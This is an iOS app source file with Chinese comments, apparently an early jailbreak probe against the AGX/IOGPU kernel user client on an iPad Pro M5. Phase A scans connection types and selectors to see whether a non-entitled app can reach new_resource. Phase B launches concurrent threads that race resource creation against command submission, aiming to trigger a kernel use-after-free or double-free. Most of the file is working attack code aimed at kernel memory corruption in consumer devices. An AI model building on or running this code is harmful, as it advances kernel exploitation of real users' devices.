/*
 * M5 Jailbreak - IOGPUDeviceUserClient 内核读写路径可达性/竞态探针
 * 目标: iPad Pro 11-inch M5 (iPadOS 26.6 23G71, t8142)
 *
 * 背景 (HANDOFF 四.14):
 *   - AGXAcceleratorG17G type1 = IOGPUDeviceUserClient，普通 App 可 OPEN (P0)
 *   - 26.6.1 修复 IOGPUFamily CVE-2026-64788 (内存破坏)：调用点 0x9cdbe5c 加锁
 *   - 关键未决: sel2 new_resource 是否被 com.apple.iokit.IOGPUFamily.API entitlement 门禁
 *   - 候选: new_resource(type=3) 核心 0x9cebae8 -> 0x9cda270 -> 0x9cedadc (getDescriptorUnsafe
 *     + 失败即 release) 描述符竞态面
 *
 * 本探针分两阶段:
 *   A. 可达性 (安全): 调 new_resource 各 type，观察返回码 -> 判定 entitlement 门
 *   B. 竞态 (高风险, 用户自选): 多线程并发 new_resource/perform_io/group_add 与 destroy，
 *      观察是否 panic (UAF/double-free 特征)。panic=设备重启，非变砖。
 * 结果写入 Documents/IOGPU_result.log
 */

#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/mman.h>
#include <errno.h>
#include <unistd.h>

static NSString *kLogPathName = @"IOGPU_result.log";

// ---------------- IOGPU constants (P0, HANDOFF 四.12/四.14) ----------------
#define IOGPU_SEL_NEW_COMMAND_QUEUE      0   // struct input (ANY) -> command queue (0x408 结构)
#define IOGPU_SEL_NEW_RESOURCE           2
#define IOGPU_SEL_SUBMIT_COMMAND_BUFFERS 3
#define IOGPU_SEL_CREATE_IO_CMD_QUEUE    7   // scalar input
#define IOGPU_SEL_CREATE_IO_CMD_BUFFER   11
#define IOGPU_SEL_PERFORM_IO             14
#define IOGPU_SEL_GROUP_ADD_RESOURCES    17
#define IOGPU_SEL_GROUP_REMOVE_RESOURCES 18

// IOGPUNewResourceArgs (0x58 bytes, P0 confirmed)
typedef struct __attribute__((packed)) {
    uint32_t resource_type;         // 0x00
    uint32_t flags;                 // 0x04
    uint64_t options;               // 0x08
    uint64_t client_virtual_addr;   // 0x10
    uint64_t client_size;           // 0x18
    uint64_t gpu_virtual_addr;      // 0x20
    uint64_t reserved1;             // 0x28
    uint64_t shared_resource_id;    // 0x30
    uint64_t suballocation_offset;  // 0x38
    uint32_t suballocation_size;    // 0x40
    uint32_t alignment;             // 0x44
    uint64_t private_data;          // 0x48
    uint32_t extended_flags;        // 0x50
    uint32_t padding;               // 0x54
} IOGPUNewResourceArgs;             // total 0x58

typedef struct {
    uint64_t resource_handle;
    uint64_t assigned_gpu_va;
    uint32_t status;
    uint32_t pad;
} IOGPUNewResourceOutput;

// ---------------- Logging helper ----------------
static NSString *gLog = @"";
static NSMutableString *gLineLog;
static pthread_mutex_t gLogLock = PTHREAD_MUTEX_INITIALIZER;

@interface ViewController : UIViewController
@property (nonatomic, strong) UITextView *logTextView;
@end

@implementation ViewController

- (void)appendLog:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        pthread_mutex_lock(&gLogLock);
        NSString *newText = [NSString stringWithFormat:@"%@\n%@", self.logTextView.text, text];
        self.logTextView.text = newText;
        pthread_mutex_unlock(&gLogLock);
        [self.logTextView scrollRangeToVisible:NSMakeRange(self.logTextView.text.length, 0)];
        [self saveLog];
    });
}

- (void)saveLog {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    if (paths.count > 0) {
        NSString *fp = [paths[0] stringByAppendingPathComponent:kLogPathName];
        [self.logTextView.text writeToFile:fp atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

- (NSString *)krName:(kern_return_t)kr {
    switch (kr) {
        case kIOReturnSuccess: return @"SUCCESS";
        case kIOReturnNotPermitted: return @"NotPermitted(ent!)";
        case kIOReturnExclusiveAccess: return @"ExclusiveAccess";
        case kIOReturnUnsupported: return @"Unsupported";
        case kIOReturnBadArgument: return @"BadArgument";
        case kIOReturnNoMemory: return @"NoMemory";
        case kIOReturnBusy: return @"Busy";
        case 0xe00002c1: return @"NoDevice(PowerOff)";
        default: return [NSString stringWithFormat:@"0x%x", (unsigned)kr];
    }
}

// ---------------- Phase A: new_resource 可达性 ----------------
- (void)testNewResourceReachability:(io_connect_t)connect {
    [self appendLog:@"\n[*] Phase A: 连接扫描 (service x type) - 定位真正的 IOGPU UserClient"];
    const char *services[] = {"AGXAcceleratorG17G", "AGXAccelerator", NULL};
    for (int si = 0; services[si] != NULL; si++) {
        const char *svcName = services[si];
        io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching(svcName));
        if (!svc) {
            [self appendLog:[NSString stringWithFormat:@"[-] 服务 %s 不存在", svcName]];
            continue;
        }
        [self appendLog:[NSString stringWithFormat:@"[i] 服务 %s:", svcName]];
        for (uint32_t type = 0; type <= 9; type++) {
            io_connect_t c = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), type, &c);
            if (kr != kIOReturnSuccess) {
                if (type <= 2)
                    [self appendLog:[NSString stringWithFormat:@"    type%u IOServiceOpen -> %@", type, [self krName:kr]]];
                continue;
            }
            // 对成功连接测 sel0 / sel2
            uint8_t qin[0x408] = {0}; memset(qin, 0x01, 0x30); *(uint64_t*)(qin+0x30)=0x1000;
            uint8_t qout[0x10] = {0}; size_t qos = sizeof(qout);
            kern_return_t kr0 = IOConnectCallStructMethod(c, 0, qin, sizeof(qin), qout, &qos);

            uint8_t rin[0x58] = {0}; uint8_t rout[0x40] = {0}; size_t ros = sizeof(rout);
            kern_return_t kr2 = IOConnectCallStructMethod(c, 2, rin, sizeof(rin), rout, &ros);

            [self appendLog:[NSString stringWithFormat:@"    type%u OPEN  sel0=%@  sel2(new_res)=%@",
                             type, [self krName:kr0], [self krName:kr2]]];
            if (kr2 == kIOReturnSuccess)
                [self appendLog:[NSString stringWithFormat:@"    [*] type%u: new_resource 可用! IOGPU 攻击面确认", type]];
            IOConnectRelease(c);
        }
        IOObjectRelease(svc);
    }
}

// ---------------- Phase B: 竞态 (高风险) ----------------
static volatile atomic_int gStopRace = 0;
static io_connect_t gConn;

static void *race_newres_thread(void *arg) {
    uint32_t type = 3;
    int iter = 0;
    while (!atomic_load(&gStopRace)) {
        size_t bufsize = 0x4000;
        void *buf = mmap(NULL, bufsize, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
        if (buf == MAP_FAILED) continue;
        IOGPUNewResourceArgs args;
        memset(&args, 0, sizeof(args));
        args.resource_type = type;
        args.client_virtual_addr = (uint64_t)(uintptr_t)buf;
        args.client_size = (uint64_t)bufsize;
        args.suballocation_size = (uint32_t)bufsize;
        args.alignment = 0x4000;
        IOGPUNewResourceOutput out;
        size_t outSize = sizeof(out);
        IOConnectCallStructMethod(gConn, IOGPU_SEL_NEW_RESOURCE, &args, sizeof(args), &out, &outSize);
        munmap(buf, bufsize);
        iter++;
    }
    return NULL;
}

static void *race_performio_thread(void *arg) {
    int iter = 0;
    while (!atomic_load(&gStopRace)) {
        IOConnectCallMethod(gConn, IOGPU_SEL_SUBMIT_COMMAND_BUFFERS, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
        iter++;
    }
    return NULL;
}

- (void)runRace:(io_connect_t)connect {
    [self appendLog:@"\n[!] Phase B: 竞态测试启动 (高风险，可能 panic -> 设备重启)"];
    gConn = connect;
    atomic_store(&gStopRace, 0);

    enum { NT = 4 };
    pthread_t th[NT];
    pthread_create(&th[0], NULL, race_newres_thread, NULL);
    pthread_create(&th[1], NULL, race_newres_thread, NULL);
    pthread_create(&th[2], NULL, race_performio_thread, NULL);
    pthread_create(&th[3], NULL, race_performio_thread, NULL);

    // 跑 3 秒
    sleep(3);
    atomic_store(&gStopRace, 1);
    for (int i = 0; i < NT; i++) pthread_join(th[i], NULL);
    [self appendLog:@"[*] Phase B 竞态 3 秒结束 (未 panic: 说明未触发或窗口未命中; panic: 见崩溃日志)"];
}

// ---------------- UI ----------------
- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor colorWithRed:0.07 green:0.08 blue:0.12 alpha:1.0];

    UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(15, 40, self.view.bounds.size.width-30, 30)];
    title.text = @"M5 IOGPU 内核读写路径探针 (v2.0)";
    title.textColor = [UIColor whiteColor];
    title.font = [UIFont boldSystemFontOfSize:16];
    title.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:title];

    UIButton *btnA = [UIButton buttonWithType:UIButtonTypeSystem];
    btnA.frame = CGRectMake(15, 80, self.view.bounds.size.width-30, 40);
    [btnA setTitle:@"A. new_resource 可达性 (安全)" forState:UIControlStateNormal];
    btnA.backgroundColor = [UIColor colorWithRed:0.2 green:0.45 blue:0.8 alpha:1.0];
    [btnA setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    btnA.layer.cornerRadius = 8;
    [btnA addTarget:self action:@selector(runA) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:btnA];

    UIButton *btnB = [UIButton buttonWithType:UIButtonTypeSystem];
    btnB.frame = CGRectMake(15, 128, self.view.bounds.size.width-30, 40);
    [btnB setTitle:@"B. 竞态测试 (高风险/可能重启)" forState:UIControlStateNormal];
    btnB.backgroundColor = [UIColor colorWithRed:0.8 green:0.3 blue:0.25 alpha:1.0];
    [btnB setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    btnB.layer.cornerRadius = 8;
    [btnB addTarget:self action:@selector(runB) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:btnB];

    self.logTextView = [[UITextView alloc] initWithFrame:CGRectMake(15, 176, self.view.bounds.size.width-30, self.view.bounds.size.height-190)];
    self.logTextView.backgroundColor = [UIColor colorWithRed:0.02 green:0.02 blue:0.04 alpha:1.0];
    self.logTextView.textColor = [UIColor colorWithRed:0.2 green:0.9 blue:0.4 alpha:1.0];
    self.logTextView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.logTextView.editable = NO;
    self.logTextView.layer.cornerRadius = 6;
    [self.view addSubview:self.logTextView];

    [self appendLog:@"[+] 就绪。先按 A 测可达性；A 成功再考虑 B (会跑 3 秒高并发)"];
}

- (io_connect_t)openIOGPU {
    io_service_t svc = IOServiceGetMatchingService(0, IOServiceMatching("AGXAcceleratorG17G"));
    if (!svc) { [self appendLog:@"[-] AGXAcceleratorG17G 服务不存在"]; return 0; }
    io_connect_t connect = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &connect);
    IOObjectRelease(svc);
    if (kr != kIOReturnSuccess) {
        [self appendLog:[NSString stringWithFormat:@"[-] IOServiceOpen type1 -> %@", [self krName:kr]]];
        return 0;
    }
    [self appendLog:[NSString stringWithFormat:@"[+] IOServiceOpen AGX type1 成功 connect=0x%x", (unsigned)connect]];
    return connect;
}

- (void)runA {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self testNewResourceReachability:0];
    });
}

- (void)runB {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        io_connect_t c = [self openIOGPU];
        if (!c) return;
        [self runRace:c];
        IOConnectRelease(c);
    });
}

@end

// ---------------- App shell ----------------
@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.rootViewController = [[ViewController alloc] init];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
